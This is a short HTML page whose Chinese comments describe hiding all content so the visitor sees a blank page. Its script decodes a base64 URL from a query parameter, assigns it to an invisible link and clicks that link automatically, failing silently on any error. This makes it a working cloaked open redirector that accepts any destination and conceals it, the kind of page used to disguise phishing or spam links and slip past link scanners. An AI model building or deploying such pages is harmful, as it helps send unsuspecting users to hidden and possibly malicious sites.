<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* 将所有可视元素隐藏，用户将看到一个空白页 */
        body { margin: 0; }
        .container { visibility: hidden; }
    </style>
</head>
<body>
    <!-- 按钮在DOM中存在，但用户看不见 -->
    <div class="container">
        <a id="jump-btn" href="#"></a>
    </div>
<script>
    (function(){
        try {
            const p = new URLSearchParams(window.location.search).get('_');
            const btn = document.getElementById('jump-btn');
            if (p && btn) {
                const u = decodeURIComponent(atob(p.replace(/ /g, '+')).split('').map(c=>'%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
                if (u && (u.startsWith('http') || u.startsWith('//')) && u !== window.location.href) {
                    // 将链接赋值给隐藏的按钮
                    btn.href = u;
                    // 立即用代码模拟点击这个隐藏的按钮
                    btn.click();
                }
            }
        } catch(e) {
            // 静默失败，如果出错则什么也不做
        }
    })();
</script>
</body>
</html>
